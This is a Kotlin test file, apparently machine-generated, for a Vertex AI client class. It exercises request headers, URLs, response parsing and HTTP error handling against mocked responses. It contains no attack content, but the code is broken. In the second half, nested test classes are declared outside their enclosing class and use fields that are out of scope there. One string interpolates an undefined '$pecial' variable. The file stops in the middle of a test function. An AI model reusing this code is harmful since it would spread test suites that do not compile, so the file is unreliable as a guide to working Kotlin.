package dev.aurakai.auraframefx.ai.clients

import io.mockk.*
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.test.runTest
import org.junit.jupiter.api.*
import org.junit.jupiter.api.Assertions.*
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.CsvSource
import org.junit.jupiter.params.provider.EmptySource
import org.junit.jupiter.params.provider.NullSource
import org.junit.jupiter.params.provider.ValueSource
import java.io.IOException
import java.net.ConnectException
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.util.concurrent.TimeoutException

@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class VertexAIClientImplTest {

    private lateinit var httpClient: HttpClient
    private lateinit var vertexAIClient: VertexAIClientImpl
    private lateinit var mockResponse: HttpResponse<String>

    private val validApiKey = "test-api-key"
    private val validProjectId = "test-project-id"
    private val validLocation = "us-central1"
    private val validModel = "gemini-pro"

    @BeforeEach
    fun setUp() {
        MockKAnnotations.init(this)
        httpClient = mockk()
        mockResponse = mockk()
        vertexAIClient = VertexAIClientImpl(httpClient, validApiKey, validProjectId, validLocation)
    }

    @AfterEach
    fun tearDown() {
        clearAllMocks()
    }

    @Nested
    @DisplayName("Constructor Tests")
    inner class ConstructorTests {

        @Test
        @DisplayName("Should create client with valid parameters")
        fun `should create client with valid parameters`() {
            assertDoesNotThrow {
                VertexAIClientImpl(httpClient, validApiKey, validProjectId, validLocation)
            }
        }

        @ParameterizedTest
        @NullSource
        @EmptySource
        @ValueSource(strings = ["", "   "])
        @DisplayName("Should throw exception for invalid API key")
        fun `should throw exception for invalid API key`(apiKey: String?) {
            assertThrows<IllegalArgumentException> {
                VertexAIClientImpl(httpClient, apiKey, validProjectId, validLocation)
            }
        }

        @ParameterizedTest
        @NullSource
        @EmptySource
        @ValueSource(strings = ["", "   "])
        @DisplayName("Should throw exception for invalid project ID")
        fun `should throw exception for invalid project ID`(projectId: String?) {
            assertThrows<IllegalArgumentException> {
                VertexAIClientImpl(httpClient, validApiKey, projectId, validLocation)
            }
        }

        @ParameterizedTest
        @NullSource
        @EmptySource
        @ValueSource(strings = ["", "   "])
        @DisplayName("Should throw exception for invalid location")
        fun `should throw exception for invalid location`(location: String?) {
            assertThrows<IllegalArgumentException> {
                VertexAIClientImpl(httpClient, validApiKey, validProjectId, location)
            }
        }
    }

    @Nested
    @DisplayName("Generate Content Tests")
    inner class GenerateContentTests {

        @Test
        @DisplayName("Should generate content successfully with valid prompt")
        fun `should generate content successfully with valid prompt`() = runTest {
            val prompt = "Test prompt"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Generated response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("Generated response", result)
            coVerify {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            }
        }

        @Test
        @DisplayName("Should handle empty response gracefully")
        fun `should handle empty response gracefully`() = runTest {
            val prompt = "Test prompt"
            val emptyResponse = """
                {
                    "candidates": []
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns emptyResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("", result)
        }

        @Test
        @DisplayName("Should handle malformed JSON response")
        fun `should handle malformed JSON response`() = runTest {
            val prompt = "Test prompt"
            val malformedJson = "{ invalid json"

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns malformedJson
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            assertThrows<RuntimeException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @ParameterizedTest
        @CsvSource(
            "400, Bad Request",
            "401, Unauthorized",
            "403, Forbidden",
            "404, Not Found",
            "500, Internal Server Error",
            "503, Service Unavailable"
        )
        @DisplayName("Should handle HTTP error responses")
        fun `should handle HTTP error responses`(statusCode: Int, errorMessage: String) = runTest {
            val prompt = "Test prompt"
            val errorResponse = """
                {
                    "error": {
                        "message": "$errorMessage"
                    }
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns statusCode
            every { mockResponse.body() } returns errorResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            assertThrows<RuntimeException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @Test
        @DisplayName("Should handle network timeout")
        fun `should handle network timeout`() = runTest {
            val prompt = "Test prompt"

            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } throws TimeoutException("Request timed out")

            assertThrows<TimeoutException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @Test
        @DisplayName("Should handle connection failure")
        fun `should handle connection failure`() = runTest {
            val prompt = "Test prompt"

            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } throws ConnectException("Connection refused")

            assertThrows<ConnectException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @Test
        @DisplayName("Should handle IO exception")
        fun `should handle IO exception`() = runTest {
            val prompt = "Test prompt"

            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } throws IOException("IO error")

            assertThrows<IOException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @ParameterizedTest
        @NullSource
        @EmptySource
        @ValueSource(strings = ["", "   "])
        @DisplayName("Should throw exception for invalid prompt")
        fun `should throw exception for invalid prompt`(prompt: String?) = runTest {
            assertThrows<IllegalArgumentException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @ParameterizedTest
        @NullSource
        @EmptySource
        @ValueSource(strings = ["", "   "])
        @DisplayName("Should throw exception for invalid model")
        fun `should throw exception for invalid model`(model: String?) = runTest {
            assertThrows<IllegalArgumentException> {
                runBlocking { vertexAIClient.generateContent("Test prompt", model) }
            }
        }

        @Test
        @DisplayName("Should handle very long prompt")
        fun `should handle very long prompt`() = runTest {
            val longPrompt = "a".repeat(10000)
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response to long prompt"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(longPrompt, validModel)

            assertEquals("Response to long prompt", result)
            coVerify {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            }
        }

        @Test
        @DisplayName("Should handle special characters in prompt")
        fun `should handle special characters in prompt`() = runTest {
            val specialPrompt = "Test with special chars: !@#$%^&*()_+-=[]{}|;:,.<>?`~"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response with special chars"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(specialPrompt, validModel)

            assertEquals("Response with special chars", result)
        }

        @Test
        @DisplayName("Should handle Unicode characters in prompt")
        fun `should handle Unicode characters in prompt`() = runTest {
            val unicodePrompt = "Test with Unicode: 你好世界 🌍 café naïve résumé"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Unicode response: 你好 🚀"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(unicodePrompt, validModel)

            assertEquals("Unicode response: 你好 🚀", result)
        }
    }

    @Nested
    @DisplayName("Request Building Tests")
    inner class RequestBuildingTests {

        @Test
        @DisplayName("Should build request with correct headers")
        fun `should build request with correct headers`() = runTest {
            val prompt = "Test prompt"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Generated response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse

            val requestSlot = slot<HttpRequest>()
            coEvery {
                httpClient.send(
                    capture(requestSlot),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            vertexAIClient.generateContent(prompt, validModel)

            val capturedRequest = requestSlot.captured
            assertTrue(capturedRequest.headers().firstValue("Authorization").isPresent)
            assertEquals(
                "Bearer $validApiKey",
                capturedRequest.headers().firstValue("Authorization").get()
            )
            assertTrue(capturedRequest.headers().firstValue("Content-Type").isPresent)
            assertEquals(
                "application/json",
                capturedRequest.headers().firstValue("Content-Type").get()
            )
        }

        @Test
        @DisplayName("Should build request with correct URL")
        fun `should build request with correct URL`() = runTest {
            val prompt = "Test prompt"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Generated response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse

            val requestSlot = slot<HttpRequest>()
            coEvery {
                httpClient.send(
                    capture(requestSlot),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            vertexAIClient.generateContent(prompt, validModel)

            val capturedRequest = requestSlot.captured
            val expectedUrl =
                "https://$validLocation-aiplatform.googleapis.com/v1/projects/$validProjectId/locations/$validLocation/publishers/google/models/$validModel:generateContent"
            assertEquals(expectedUrl, capturedRequest.uri().toString())
        }

        @Test
        @DisplayName("Should build request with correct JSON body")
        fun `should build request with correct JSON body`() = runTest {
            val prompt = "Test prompt"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Generated response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse

            val requestSlot = slot<HttpRequest>()
            coEvery {
                httpClient.send(
                    capture(requestSlot),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            vertexAIClient.generateContent(prompt, validModel)

            val capturedRequest = requestSlot.captured
            val bodyPublisher = capturedRequest.bodyPublisher()
            assertTrue(bodyPublisher.isPresent)

            // The body should contain the structured request with the prompt
            // This is a simplified check - in practice, you'd want to parse the JSON
            // and verify the structure more thoroughly
        }
    }

    @Nested
    @DisplayName("Response Parsing Tests")
    inner class ResponseParsingTests {

        @Test
        @DisplayName("Should parse response with single candidate")
        fun `should parse response with single candidate`() = runTest {
            val prompt = "Test prompt"
            val response = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Single candidate response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns response
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("Single candidate response", result)
        }

        @Test
        @DisplayName("Should parse response with multiple candidates and return first")
        fun `should parse response with multiple candidates and return first`() = runTest {
            val prompt = "Test prompt"
            val response = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "First candidate"
                                    }
                                ]
                            }
                        },
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Second candidate"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns response
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("First candidate", result)
        }

        @Test
        @DisplayName("Should handle response with multiple parts")
        fun `should handle response with multiple parts`() = runTest {
            val prompt = "Test prompt"
            val response = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Part 1"
                                    },
                                    {
                                        "text": "Part 2"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns response
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertTrue(result.contains("Part 1"))
            assertTrue(result.contains("Part 2"))
        }

        @Test
        @DisplayName("Should handle response with missing text field")
        fun `should handle response with missing text field`() = runTest {
            val prompt = "Test prompt"
            val response = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "functionCall": {
                                            "name": "test_function"
                                        }
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns response
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("", result)
        }
    }

    @Nested
    @DisplayName("Edge Cases and Error Handling")
    inner class EdgeCasesTests {

        @Test
        @DisplayName("Should handle null response body")
        fun `should handle null response body`() = runTest {
            val prompt = "Test prompt"

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns null
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            assertThrows<RuntimeException> {
                runBlocking { vertexAIClient.generateContent(prompt, validModel) }
            }
        }

        @Test
        @DisplayName("Should handle response with invalid JSON structure")
        fun `should handle response with invalid JSON structure`() = runTest {
            val prompt = "Test prompt"
            val invalidStructure = """
                {
                    "notCandidates": []
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns invalidStructure
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("", result)
        }

        @Test
        @DisplayName("Should handle response with null candidates")
        fun `should handle response with null candidates`() = runTest {
            val prompt = "Test prompt"
            val response = """
                {
                    "candidates": null
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns response
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(prompt, validModel)

            assertEquals("", result)
        }

        @Test
        @DisplayName("Should handle concurrent requests properly")
        fun `should handle concurrent requests properly`() = runTest {
            val prompt1 = "Test prompt 1"
            val prompt2 = "Test prompt 2"
            val response1 = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response 1"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()
            val response2 = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response 2"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returnsMany listOf(response1, response2)
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result1 = vertexAIClient.generateContent(prompt1, validModel)
            val result2 = vertexAIClient.generateContent(prompt2, validModel)

            assertEquals("Response 1", result1)
            assertEquals("Response 2", result2)
            coVerify(exactly = 2) {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            }
        }
    }

    @Nested
    @DisplayName("Performance and Resource Tests")
    inner class PerformanceTests {

        @Test
        @DisplayName("Should handle rapid successive requests")
        fun `should handle rapid successive requests`() = runTest {
            val prompt = "Test prompt"
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Generated response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            repeat(10) {
                val result = vertexAIClient.generateContent(prompt, validModel)
                assertEquals("Generated response", result)
            }

            coVerify(exactly = 10) {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            }
        }

        @Test
        @DisplayName("Should handle memory-intensive prompts")
        fun `should handle memory-intensive prompts`() = runTest {
            val largePrompt = "Large prompt: " + "x".repeat(100000)
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response to large prompt"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            val result = vertexAIClient.generateContent(largePrompt, validModel)

            assertEquals("Response to large prompt", result)
        }
    }

    @Nested
    @DisplayName("Integration Scenarios")
    inner class IntegrationTests {

        @Test
        @DisplayName("Should handle different model types")
        fun `should handle different model types`() = runTest {
            val prompt = "Test prompt"
            val models = listOf("gemini-pro", "gemini-pro-vision", "text-bison", "chat-bison")
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Model response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            models.forEach { model ->
                val result = vertexAIClient.generateContent(prompt, model)
                assertEquals("Model response", result)
            }

            coVerify(exactly = models.size) {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            }
        }

        @Test
        @DisplayName("Should handle different locations")
        fun `should handle different locations`() = runTest {
            val prompt = "Test prompt"
            val locations = listOf("us-central1", "us-east1", "europe-west1", "asia-northeast1")
            val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Location response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            locations.forEach { location ->
                val client = VertexAIClientImpl(httpClient, validApiKey, validProjectId, location)
                val result = client.generateContent(prompt, validModel)
                assertEquals("Location response", result)
            }

            coVerify(exactly = locations.size) {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            }
        }
    }
}

@Nested
@DisplayName("Advanced Error Handling Tests")
inner class AdvancedErrorHandlingTests {

    @Test
    @DisplayName("Should handle rate limiting with 429 status code")
    fun `should handle rate limiting with 429 status code`() = runTest {
        val prompt = "Test prompt"
        val rateLimitResponse = """
                {
                    "error": {
                        "code": 429,
                        "message": "Rate limit exceeded",
                        "details": [
                            {
                                "reason": "RATE_LIMIT_EXCEEDED"
                            }
                        ]
                    }
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 429
        every { mockResponse.body() } returns rateLimitResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        assertThrows<RuntimeException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }

    @Test
    @DisplayName("Should handle quota exceeded error")
    fun `should handle quota exceeded error`() = runTest {
        val prompt = "Test prompt"
        val quotaResponse = """
                {
                    "error": {
                        "code": 403,
                        "message": "Quota exceeded",
                        "details": [
                            {
                                "reason": "QUOTA_EXCEEDED"
                            }
                        ]
                    }
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 403
        every { mockResponse.body() } returns quotaResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        assertThrows<RuntimeException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }

    @Test
    @DisplayName("Should handle authentication token expiration")
    fun `should handle authentication token expiration`() = runTest {
        val prompt = "Test prompt"
        val authErrorResponse = """
                {
                    "error": {
                        "code": 401,
                        "message": "Request had invalid authentication credentials",
                        "details": [
                            {
                                "reason": "INVALID_CREDENTIALS"
                            }
                        ]
                    }
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 401
        every { mockResponse.body() } returns authErrorResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        assertThrows<RuntimeException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }

    @Test
    @DisplayName("Should handle server overload with 503 status")
    fun `should handle server overload with 503 status`() = runTest {
        val prompt = "Test prompt"
        val overloadResponse = """
                {
                    "error": {
                        "code": 503,
                        "message": "Service temporarily unavailable",
                        "details": [
                            {
                                "reason": "SERVICE_UNAVAILABLE"
                            }
                        ]
                    }
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 503
        every { mockResponse.body() } returns overloadResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        assertThrows<RuntimeException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }

    @Test
    @DisplayName("Should handle interrupted exception during request")
    fun `should handle interrupted exception during request`() = runTest {
        val prompt = "Test prompt"

        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } throws InterruptedException("Thread interrupted")

        assertThrows<InterruptedException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }

    @Test
    @DisplayName("Should handle security exception")
    fun `should handle security exception`() = runTest {
        val prompt = "Test prompt"

        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } throws SecurityException("Security violation")

        assertThrows<SecurityException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }
}

@Nested
@DisplayName("Request Validation Tests")
inner class RequestValidationTests {

    @Test
    @DisplayName("Should validate model name format")
    fun `should validate model name format`() = runTest {
        val prompt = "Test prompt"
        val invalidModels = listOf("invalid/model", "model with spaces", "model@special")

        invalidModels.forEach { invalidModel ->
            // Assuming the implementation validates model names
            // This would need to be adjusted based on actual validation logic
            assertDoesNotThrow {
                runBlocking { vertexAIClient.generateContent(prompt, invalidModel) }
            }
        }
    }

    @Test
    @DisplayName("Should handle extremely long model names")
    fun `should handle extremely long model names`() = runTest {
        val prompt = "Test prompt"
        val longModel = "a".repeat(1000)

        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns expectedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        assertDoesNotThrow {
            runBlocking { vertexAIClient.generateContent(prompt, longModel) }
        }
    }

    @Test
    @DisplayName("Should validate project ID format")
    fun `should validate project ID format`() = runTest {
        val invalidProjectIds = listOf("project_with_underscores", "project-with-$pecial", "")

        invalidProjectIds.forEach { invalidProjectId ->
            assertThrows<IllegalArgumentException> {
                VertexAIClientImpl(httpClient, validApiKey, invalidProjectId, validLocation)
            }
        }
    }

    @Test
    @DisplayName("Should validate location format")
    fun `should validate location format`() = runTest {
        val invalidLocations = listOf("invalid_location", "location with spaces", "UPPERCASE")

        invalidLocations.forEach { invalidLocation ->
            assertThrows<IllegalArgumentException> {
                VertexAIClientImpl(httpClient, validApiKey, validProjectId, invalidLocation)
            }
        }
    }
}

@Nested
@DisplayName("Response Content Variation Tests")
inner class ResponseContentVariationTests {

    @Test
    @DisplayName("Should handle response with safety ratings")
    fun `should handle response with safety ratings`() = runTest {
        val prompt = "Test prompt"
        val responseWithSafety = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Safe response"
                                    }
                                ]
                            },
                            "safetyRatings": [
                                {
                                    "category": "HARM_CATEGORY_HARASSMENT",
                                    "probability": "NEGLIGIBLE"
                                }
                            ]
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns responseWithSafety
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("Safe response", result)
    }

    @Test
    @DisplayName("Should handle response with finish reason")
    fun `should handle response with finish reason`() = runTest {
        val prompt = "Test prompt"
        val responseWithFinishReason = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Complete response"
                                    }
                                ]
                            },
                            "finishReason": "STOP"
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns responseWithFinishReason
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("Complete response", result)
    }

    @Test
    @DisplayName("Should handle response with citation metadata")
    fun `should handle response with citation metadata`() = runTest {
        val prompt = "Test prompt"
        val responseWithCitations = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response with citations"
                                    }
                                ]
                            },
                            "citationMetadata": {
                                "citations": [
                                    {
                                        "startIndex": 0,
                                        "endIndex": 10,
                                        "uri": "https://example.com"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns responseWithCitations
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("Response with citations", result)
    }

    @Test
    @DisplayName("Should handle response with blocked content")
    fun `should handle response with blocked content`() = runTest {
        val prompt = "Test prompt"
        val blockedResponse = """
                {
                    "candidates": [
                        {
                            "finishReason": "SAFETY",
                            "safetyRatings": [
                                {
                                    "category": "HARM_CATEGORY_HARASSMENT",
                                    "probability": "HIGH"
                                }
                            ]
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns blockedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("", result)
    }

    @Test
    @DisplayName("Should handle response with usage metadata")
    fun `should handle response with usage metadata`() = runTest {
        val prompt = "Test prompt"
        val responseWithUsage = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response with usage info"
                                    }
                                ]
                            }
                        }
                    ],
                    "usageMetadata": {
                        "promptTokenCount": 10,
                        "candidatesTokenCount": 20,
                        "totalTokenCount": 30
                    }
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns responseWithUsage
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("Response with usage info", result)
    }
}

@Nested
@DisplayName("Concurrency and Threading Tests")
inner class ConcurrencyTests {

    @Test
    @DisplayName("Should handle multiple concurrent requests with different prompts")
    fun `should handle multiple concurrent requests with different prompts`() = runTest {
        val prompts = (1..5).map { "Test prompt $it" }
        val responses = prompts.map { prompt ->
            """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Response to $prompt"
                                    }
                                ]
                            }
                        }
                    ]
                }
                """.trimIndent()
        }

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returnsMany responses
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val results = prompts.map { prompt ->
            vertexAIClient.generateContent(prompt, validModel)
        }

        results.forEachIndexed { index, result ->
            assertTrue(result.contains("Response to Test prompt ${index + 1}"))
        }
